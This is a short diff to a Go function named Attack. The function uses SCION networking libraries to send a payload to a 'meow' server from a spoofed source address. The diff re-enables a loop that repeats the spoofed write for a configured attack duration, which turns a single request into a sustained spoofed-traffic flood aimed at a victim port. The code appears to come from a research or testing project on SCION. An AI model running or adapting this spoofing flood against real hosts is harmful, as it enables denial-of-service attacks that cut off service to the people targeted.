@@ -173,6 +173,7 @@ func Attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAdd
 		}
 	} else {
 		fmt.Println(spoofedAddr.IA, meowSCIONAddr.IA, spoofedAddr.Host, spoofedAddr.Host.Port, VictimPort())
+		///localIA, err := scionDaemon.LocalIA(ctx)
 		scionNetwork := snet.NewNetwork(spoofedAddr.IA, dispatcher, nil)
 		paths, err := scionDaemon.Paths(ctx, spoofedAddr.IA, meowSCIONAddr.IA, daemon.PathReqFlags{})
 		path := paths[0]
@@ -201,7 +202,7 @@ func Attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAdd
 
 		fmt.Println("Write success, bytes written, to, from", n_bytes, conn.RemoteAddr(), conn.LocalAddr())
 
-		/*attackDuration := AttackDuration()
+		attackDuration := AttackDuration()
 		for start := time.Now(); time.Since(start) < attackDuration; {
 			// make request to meow with spoofed addr
 			_, err = conn.Write(payload)
@@ -209,7 +210,7 @@ func Attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAdd
 				log.Fatal("Write failed", err)
 			}
 			//fmt.Println("Write success, bytes written", n_bytes)
-		}*/
+		}
 	}
 	return nil
 }
